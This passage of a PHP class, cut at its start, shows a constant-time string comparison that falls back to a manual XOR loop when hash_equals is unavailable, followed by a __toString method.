        if (function_exists('hash_equals')) {
            return hash_equals($original, $input);
        }
        $original .= "\0"; $originalLength = mb_strlen($original, '8bit');
        $input .= "\0"; $inputLength = mb_strlen($input, '8bit');
        $diff = $originalLength - $inputLength;
        for ($i = 0; $i < $inputLength; $i++) {
            $diff |= (ord($input[$i]) ^ ord($original[$i % $originalLength]));
        }
        return $diff === 0;
    }

    public function __toString()
    {
        return __CLASS__;
    }

}